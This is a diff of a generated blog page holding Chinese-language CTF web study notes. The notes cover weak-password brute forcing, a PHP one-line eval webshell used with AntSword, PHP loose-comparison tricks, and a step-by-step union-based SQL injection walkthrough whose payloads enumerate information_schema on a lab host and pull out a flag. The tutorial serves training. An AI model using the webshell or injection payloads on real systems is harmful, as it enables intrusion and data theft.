@@ -19,18 +19,30 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="web学习笔记记录一下学习过程中遇见的常见ctf中web赛道的题目、题型。多是利用Hackbar、Burpsuite、蚁剑等工具。 一、简单类型1.常规弱口令密码登录利用Burpsuite抓包，将所得数据包发送到Intruder进行爆破，导入弱口令字典，将登录请求的包中的用户名和密码替换成常规弱口令。 2.一句话木马 先尝试一句话木马代码放入网页中，当访问该网页时，浏览器会自动执行该代码。用蚁剑输">
+    <meta name="description" content="web学习笔记记录一下学习过程中遇见的常见ctf中web赛道的题目、题型。多是利用Hackbar、Burpsuite、蚁剑等工具。 一、简单类型1.常规弱口令密码登录利用Burpsuite抓包，将所得数据包发送到Intruder进行爆破，导入弱口令字典，将登录请求的包中的用户名和密码替换成常规弱口令。 2.一句话木马&lt;?php @eval($_POsT[&#39;a&#39;]); ?&amp;gt">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web学习笔记">
 <meta property="og:url" content="http://example.com/2025/09/25/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="web学习笔记记录一下学习过程中遇见的常见ctf中web赛道的题目、题型。多是利用Hackbar、Burpsuite、蚁剑等工具。 一、简单类型1.常规弱口令密码登录利用Burpsuite抓包，将所得数据包发送到Intruder进行爆破，导入弱口令字典，将登录请求的包中的用户名和密码替换成常规弱口令。 2.一句话木马 先尝试一句话木马代码放入网页中，当访问该网页时，浏览器会自动执行该代码。用蚁剑输">
+<meta property="og:description" content="web学习笔记记录一下学习过程中遇见的常见ctf中web赛道的题目、题型。多是利用Hackbar、Burpsuite、蚁剑等工具。 一、简单类型1.常规弱口令密码登录利用Burpsuite抓包，将所得数据包发送到Intruder进行爆破，导入弱口令字典，将登录请求的包中的用户名和密码替换成常规弱口令。 2.一句话木马&lt;?php @eval($_POsT[&#39;a&#39;]); ?&amp;gt">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/6328903c1c83ad753799bb6bde93d256.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/3c139bc7c8fa1b4f8b983bde56c8d91a.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/bc23b03bbb55caaf0e4a48bea05f0de3.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/48d3dfb009e892ea873b2fe37d14c60d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/6e9fdbc0e46168445335f7927ad7a536.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/5c28284945c8bf803becbc36cc38d821.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/1cce48ed1295c2441e25c478f5581a80.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/abc01f913be11a97cfb9000822eaa54e.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/34b436a22f21380417d854f3f55208cb.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/1cce48ed1295c2441e25c478f5581a80.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e2fa439d05484804ce4647b1e5ae80fc.png">
 <meta property="article:published_time" content="2025-09-25T14:20:24.000Z">
-<meta property="article:modified_time" content="2025-09-26T03:14:02.564Z">
+<meta property="article:modified_time" content="2025-09-26T08:14:20.920Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="ctf&#x2F;web&#x2F;学习记录&#x2F;基础">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i-blog.csdnimg.cn/blog_migrate/6328903c1c83ad753799bb6bde93d256.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -238,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          801 字
+          2.5k 字
         
       </span>
     
@@ -249,7 +261,7 @@
         
         
         
-          7 分钟
+          21 分钟
         
       </span>
     
@@ -293,15 +305,185 @@
                 
                 <h1 id="web学习笔记"><a href="#web学习笔记" class="headerlink" title="web学习笔记"></a>web学习笔记</h1><p>记录一下学习过程中遇见的常见ctf中web赛道的题目、题型。<br>多是利用Hackbar、Burpsuite、蚁剑等工具。</p>
 <h2 id="一、简单类型"><a href="#一、简单类型" class="headerlink" title="一、简单类型"></a>一、简单类型</h2><h3 id="1-常规弱口令密码登录"><a href="#1-常规弱口令密码登录" class="headerlink" title="1.常规弱口令密码登录"></a>1.常规弱口令密码登录</h3><p>利用Burpsuite抓包，将所得数据包发送到Intruder进行爆破，导入弱口令字典，将登录请求的包中的用户名和密码替换成常规弱口令。</p>
-<h3 id="2-一句话木马"><a href="#2-一句话木马" class="headerlink" title="2.一句话木马"></a>2.一句话木马</h3><?php @eval($_POsT['a']); ?>
-<p>先尝试一句话木马代码放入网页中，当访问该网页时，浏览器会自动执行该代码。<br>用蚁剑输入攻击目标网页的URL，先右键点击空白处，选择添加数据，再输入URL，链接密码则选择post传递过去的a，即可getshell，查看网页后端的文件夹。</p>
-<h3 id="3-后端代码多重验证与绕过"><a href="#3-后端代码多重验证与绕过" class="headerlink" title="3.后端代码多重验证与绕过"></a>3.后端代码多重验证与绕过</h3><p>如果能直接观察到后端代码，先观察验证条件，尝试全部满足，无法全部满足则尝试逐一绕过。<br>并且观察是Get传参还是Post传参，利用Hackbar进行数据上传。<br>get直接在URL后面加参数，post则在body中上传参数。</p>
-<p>看见replace函数可以尝试双写绕过；<br>看见flie_get_contents函数(可以上传数据流)可以尝试上传文件,上传数据流或将数据流编码之后绕过。<br>strpos函数查找目标字符在另一字符串中的位置并返回。</p>
-<h3 id="4-robots协议"><a href="#4-robots协议" class="headerlink" title="4.robots协议"></a>4.robots协议</h3><p>robots协议是一种网络爬虫协议，用于告诉搜索引擎哪些页面可以抓取。<br>若网页有提示为robots协议或有robots文件夹，则可以进入robots.txt文件，查看是否有禁止爬虫的文档，尝试访问寻找flag。</p>
-<h3 id="5-vim隐藏flag"><a href="#5-vim隐藏flag" class="headerlink" title="5.vim隐藏flag"></a>5.vim隐藏flag</h3><p>vim是linux中的文件编辑器，其打开后会创建.swp的临时文件，隐藏flag一般在临时文件中。<br>一般先尝试访问index.php,不行则去尝试访问.index.php.swp,若能成功获取文件，则flag可能就在里面。</p>
-<h3 id="6-弱类型问题"><a href="#6-弱类型问题" class="headerlink" title="6.弱类型问题"></a>6.弱类型问题</h3><p>如php语言中的弱比较“&#x3D;&#x3D;”，将不同类型值转化成相同类型来比较。<br>规则是：当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含‘.’，‘e’，‘E’并且其数值值在整形的范围之内，则该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。<br>0e形式的字符串会被识别为科学计数法，将被转化为数字做比较。<br>例如：<br>&lt;?php<br>var_dump(“admin”&#x3D;&#x3D;0);&#x2F;&#x2F;true<br>var_dump(“1admin”&#x3D;&#x3D;1); &#x2F;&#x2F;true<br>var_dump(“admin1”&#x3D;&#x3D;1)&#x2F;&#x2F;false<br>var_dump(“admin1”&#x3D;&#x3D;0)&#x2F;&#x2F;true<br>var_dump(“0e123456”&#x3D;&#x3D;”0e4456789”); &#x2F;&#x2F;true<br>？&gt;&#x2F;&#x2F;上述代码可自行测试</p>
-<h2 id="二、SQL注入类型"><a href="#二、SQL注入类型" class="headerlink" title="二、SQL注入类型"></a>二、SQL注入类型</h2><p>结构化查询语言（Structured Query Language）简称 SQL，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p>
+<h3 id="2-一句话木马"><a href="#2-一句话木马" class="headerlink" title="2.一句话木马"></a>2.一句话木马</h3><p><code>&lt;?php @eval($_POsT[&#39;a&#39;]); ?&gt;</code></p>
+<ul>
+<li>先尝试一句话木马代码放入网页中，当访问该网页时，浏览器会自动执行该代码。</li>
+<li>用蚁剑输入攻击目标网页的URL，先右键点击空白处，选择添加数据，再输入URL，链接密码则选择post传递过去的a，即可getshell，查看网页后端的文件夹。</li>
+</ul>
+<h3 id="3-后端代码多重验证与绕过"><a href="#3-后端代码多重验证与绕过" class="headerlink" title="3.后端代码多重验证与绕过"></a>3.后端代码多重验证与绕过</h3><p>如果能直接观察到后端代码，先观察验证条件，尝试全部满足，无法全部满足则尝试逐一绕过。<br>并且观察是Get传参还是Post传参，利用Hackbar进行数据上传。<br><em><strong>get直接在URL后面加参数，post则在body中上传参数。</strong></em></p>
+<ul>
+<li>看见replace函数可以尝试双写绕过；</li>
+<li>看见flie_get_contents函数(可以上传数据流)可以尝试上传文件,上传数据流或将数据流编码之后绕过。</li>
+<li>strpos函数查找目标字符在另一字符串中的位置并返回。</li>
+</ul>
+<h3 id="4-robots协议"><a href="#4-robots协议" class="headerlink" title="4.robots协议"></a>4.robots协议</h3><p>robots协议是一种网络爬虫协议，用于告诉搜索引擎哪些页面可以抓取。</p>
+<ul>
+<li>若网页有提示为robots协议或有robots文件夹，则可以进入robots.txt文件，查看是否有禁止爬虫的文档，尝试访问寻找flag。</li>
+</ul>
+<h3 id="5-vim隐藏flag"><a href="#5-vim隐藏flag" class="headerlink" title="5.vim隐藏flag"></a>5.vim隐藏flag</h3><p>vim是linux中的文件编辑器，其打开后会创建.swp的临时文件，隐藏flag一般在临时文件中。</p>
+<ul>
+<li>一般先尝试访问index.php,不行则去尝试访问.index.php.swp,若能成功获取文件，则flag可能就在里面。</li>
+</ul>
+<h3 id="6-弱类型问题"><a href="#6-弱类型问题" class="headerlink" title="6.弱类型问题"></a>6.弱类型问题</h3><ul>
+<li>如php语言中的弱比较“&#x3D;&#x3D;”，将不同类型值转化成相同类型来比较。</li>
+<li>规则是：当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含‘.’，‘e’，‘E’并且其数值值在整形的范围之内，则该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</li>
+<li>0e形式的字符串会被识别为科学计数法，将被转化为数字做比较。<br>例如：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>)<span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>)<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true</span><br>？&gt;<span class="hljs-comment">//上述代码可自行测试。</span><br></code></pre></td></tr></table></figure>
 
+<hr>
+<h2 id="二、SQL注入类型"><a href="#二、SQL注入类型" class="headerlink" title="二、SQL注入类型"></a>二、SQL注入类型</h2><p>结构化查询语言（Structured Query Language）简称 SQL，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p>
+<ul>
+<li>注入原理：通过把用户输入的数据（如SQL语句）插入到SQL命令中，来欺骗服务器执行恶意的SQL命令，从而达到非法获取数据或执行任意命令的目的。</li>
+<li>攻击者通过构造不同的SQL语句来实现对数据库的操作。</li>
+<li>两个关键条件：</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">参数用户可控 —— 即用户能够控制数据的输入<br>我们构造的参数可带入数据库执行 —— 原本要执行的代码，拼接了用户的输入<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>总结一下：<br>sql 注入的核心<br><strong>将用户输入的数据拼接到代码中，并被当成 sql 语句执行。</strong></p>
+</li>
+<li><p>常见SQL注入语句：</p>
+</li>
+</ul>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> *<span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> *<span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> *<span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="1-SQL注入的一般步骤"><a href="#1-SQL注入的一般步骤" class="headerlink" title="1.SQL注入的一般步骤"></a>1.SQL注入的一般步骤</h2><h3 id="判断注入点-——-第一步"><a href="#判断注入点-——-第一步" class="headerlink" title="判断注入点 —— 第一步"></a>判断注入点 —— 第一步</h3><ul>
+<li><u>找页面与数据库<strong>产生交互</strong>的地方。</u></li>
+</ul>
+<p>如有一串URL，<a target="_blank" rel="noopener" href="http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1%E3%80%82">http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1。</a></p>
+<p>这一长串url中 ’ ? ’ 后跟的就是参数<code>id=1</code>，’ <strong>?</strong> ’ 表示<strong>传参</strong>。一般来讲 ’ ? ‘的内容都是用户可控的。若不存在能够与数据库产生交互的地方，那么sql注入也就自然无处下手了。</p>
+<p>传入SQL语句可控参数分为两类：</p>
+<ul>
+<li><p>数字类型，参数不用被引号引用 <code>?id=1</code></p>
+</li>
+<li><p>其他类型，参数需要被引号引用 <code>?name=&quot;phone&quot;</code></p>
+</li>
+</ul>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6328903c1c83ad753799bb6bde93d256.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><u><strong>界面报错</strong></u><br><u><strong>证实此处的传参的确将用户输入当做代码执行了，即存在sql注入漏洞。</u></strong></p>
+<h3 id="判断字段数-——-第二步"><a href="#判断字段数-——-第二步" class="headerlink" title="判断字段数 —— 第二步"></a>判断字段数 —— 第二步</h3><p>使用<strong>order by</strong>子句，利用网页报错判断字段数，为下一步铺垫</p>
+<ul>
+<li><strong>ORDER BY 语句</strong>用于根据指定的列<strong>对结果集进行排序</strong>。</li>
+<li>利用<strong>order by</strong>语句逐次尝试1、2、3···，<strong>直到出现报错</strong>，那么报错数字<strong>x-1</strong>就是此处存在的字段数。</li>
+</ul>
+<h3 id="判断回显点-——-第三步"><a href="#判断回显点-——-第三步" class="headerlink" title="判断回显点 —— 第三步"></a>判断回显点 —— 第三步</h3><p>接下来我们要使用<strong>union select</strong>语句，<strong>联合查询</strong>，通过页面回显找到回显点，再利用其获取我们需要查询的数据。</p>
+<h5 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h5><p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_select.asp">select</a> 语句用于从表中选取数据。<br><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_union.asp">union</a> 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
+<p>UNION 结果集中的列名<strong>总是等于</strong> UNION 中第一个 SELECT 语句中的<strong>列名</strong>。</p>
+<p>就是联合查询前后的两个表，<strong>第一个表的字段数与第二个表的字段数必须相等</strong>，否则就会报错：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/3c139bc7c8fa1b4f8b983bde56c8d91a.png" srcset="/img/loading.gif" lazyload alt="这是一个图片"></p>
+<p>如果一个表的字段数与第二个表的字段数不相等时，我们可以进行如下操作手动补全：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://injectx1.lab.aqlab.cn:<span class="hljs-number">81</span>/Pass-<span class="hljs-number">01</span>/index.php?id=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p>这样就显示正常了</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/bc23b03bbb55caaf0e4a48bea05f0de3.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<p>但我们会发现，这个界面与初始界面一模一样。<br>因为这里<strong>优先显示的是联合查询的第一个结果，而第二个结果未被显示</strong>。<br>所以我们只需要在这里<strong>使联合查询的第一个结果不显示</strong>（使前半段语句为假，则不返回任何内容）：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>:*//injectx1.lab.aqlab.cn:<span class="hljs-number">81</span>/Pass-<span class="hljs-number">01</span>/index.php?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>*<br></code></pre></td></tr></table></figure>
+
+<p>回显结果是：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/48d3dfb009e892ea873b2fe37d14c60d.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<p>我们发现”Your Login Name“后显示的是第二个字段的内容<br>“Password” 后显示的是第三个字段的内容。</p>
+<ul>
+<li><strong>为了保险起见还可以将2，3替换为其他数字再次测试。</strong></li>
+</ul>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6e9fdbc0e46168445335f7927ad7a536.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<ul>
+<li>证实了我们的猜想。<br>由此可以得到，回显点就在”<strong>Your Login Name</strong>“和”<strong>Password</strong>“ 后的位置</li>
+</ul>
+<h3 id="查询相关内容-——-第四步"><a href="#查询相关内容-——-第四步" class="headerlink" title="查询相关内容 —— 第四步"></a>查询相关内容 —— 第四步</h3><p>接下来我们利用显错位获取相关内容，这里我们再分几步进行<br><a target="_blank" rel="noopener" href="https://www.pianshen.com/article/3739146098/"><strong>mysql</strong>中的information_schema说明</a><br><a target="_blank" rel="noopener" href="http://help.wopus.org/mysql-manage/607.html">information_schema</a> : mysql数据库5.0以上版本，自带数据库，记录了mysql下所有的库名，表名，列名等信息。<br><strong>主要用到以下几个：</strong></p>
+<ul>
+<li>schemata表 (mysql服务器中所有数据库信息的表)</li>
+<li>tables表 (mysql服务器中所有表信息的表)</li>
+<li>columns表（mysql服务器所有列信息的表）</li>
+<li>table_schema 数据库名</li>
+<li>table_name 表名</li>
+<li>column_name 列名</li>
+</ul>
+<h4 id="判断库名"><a href="#判断库名" class="headerlink" title="判断库名"></a>判断库名</h4><p>MySQL中的 <strong>database()函数</strong> 返回默认或当前数据库的名称。</p>
+<p>在刚刚的回显点加入database函数，以此得到库名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,database(),database()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5c28284945c8bf803becbc36cc38d821.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<h4 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h4><p>为了查询表名，我们将union后的语句改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;error&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><strong>下面对这段语句进行详细解释：</strong></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">SELECT_</span>(列名<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,…)_ FROM <span class="hljs-built_in">_</span>(表名)<br></code></pre></td></tr></table></figure>
+
+<p>已知回显点在列名2和列名3，我们将需要查询返回的数据放在回显点处。<br><code>table_name</code>列在<code>information_schema</code>库的<code>tables</code>表下。<br>注意这里不能直接写表名tables， 否则它会在<code>error</code>库下找tables表，找不到就会报错。	<br>因此需要使用【库名.表名】的格式：<code>information_schema.tables</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_where.asp">where子句</a> <strong>用于规定选择的标准</strong>。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">WHERE_</span><span class="hljs-params">(限定条件)</span></span><br></code></pre></td></tr></table></figure>
+
+<p>我们需要查询的是<code>error</code>库的表名，因此在查询中限定<code>table_schema=&#39;error&#39;</code>.<br>也就是返回本张表中所有<code>table_schema</code>这一字段的值为<code>error</code>的数据所对应的<code>table_name</code>值。</p>
+<p>现在我们实践一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;error&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>为了显示union select后的内容，我们同样在前面加上<code>and 1=2</code></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1cce48ed1295c2441e25c478f5581a80.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<p>得到一个表名：<code>error_flag</code></p>
+<h4 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h4><p>同理，列<code>column_name</code>在表<code>information_schema.column</code>下<br>union后修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,column_name,3 from information_schema.columns where table_schema=&#x27;error&#x27; and table_name=&#x27;error_flag&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/abc01f913be11a97cfb9000822eaa54e.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<p>得到一个列名：<code>ld</code><br>但是如何查询其他列名？这里我们需要用到<strong>limit子句</strong>。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cai170221/p/7122289.html">limit子句</a> <strong>用于强制 SELECT 语句返回指定的记录数。</strong></p>
+<blockquote>
+<p><strong>LIMIT_(参数1),(参数2)</strong><br>第一个参数指定第一个返回记录行的偏移量（注意这里从0计数），第二个参数指定返回记录行的最大数目。<br>即 <strong>第(参数1)+1个数据 到 第(参数1+参数2)+1个数据</strong></p>
+</blockquote>
+<p>实践一下，查询第二个列名 <code>limit 1,1</code>（即查询第二个列，只返回一行记录）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,column_name,3 from information_schema.columns where table_schema=&#x27;error&#x27; and table_name=&#x27;error_flag&#x27; limit 1,1<br></code></pre></td></tr></table></figure>
+
+<p>得到结果如下：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/34b436a22f21380417d854f3f55208cb.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<p>得到第二个列名：<code>flag</code></p>
+<p>当然也可以利用<code>group_concat()</code>函数 一起输出所有列名 （不推荐，有可能回显点有字符输出限制导致输出不完整）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;error&#x27; and table_name=&#x27;error_flag&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1cce48ed1295c2441e25c478f5581a80.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<p>我们现在已经找到了flag字段所在的列名<code>error_flag</code><br>接下来直接使用SELECT语句就可以直接查询flag的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,flag,3 from error_flag<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e2fa439d05484804ce4647b1e5ae80fc.png" srcset="/img/loading.gif" lazyload alt="解释图片"></p>
+<p>得到flag字段的具体信息： zKaQ-Nf</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>SQL手注四部曲：</p>
+<ul>
+<li><strong>判断注入点</strong></li>
+</ul>
+<blockquote>
+<p><strong>id&#x3D;1 and 1&#x3D;2</strong></p>
+</blockquote>
+<ul>
+<li><p><strong>判断字段数</strong></p>
+<blockquote>
+<p><strong>id&#x3D;1 order by 1</strong></p>
+<p><strong>id&#x3D;1 order by 2</strong></p>
+<p><strong>id&#x3D;1 order by 3</strong></p>
+<p>……</p>
+</blockquote>
+</li>
+<li><p><strong>判断回显点</strong></p>
+<blockquote>
+<p><strong>id&#x3D;1 and 1&#x3D;2 union select 1,2,3</strong></p>
+<p><strong>id&#x3D;1 and 1&#x3D;2 union select 123,222,333</strong></p>
+</blockquote>
+</li>
+<li><p><strong>查询相关内容</strong></p>
+<blockquote>
+<p><strong>id&#x3D;1 and 1&#x3D;2 union select 1,database(),3</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>id&#x3D;1 and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’error’</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;’error’ and table_name&#x3D;’error_flag’ limit 1,1</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>id&#x3D;1 ans 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;‘error’ and table_name&#x3D;’error_flag’</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>union select 1,flag,3 from error_flag</strong></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="三-文件上传漏洞"><a href="#三-文件上传漏洞" class="headerlink" title="三.文件上传漏洞"></a>三.文件上传漏洞</h2>
                 
               </div>
             
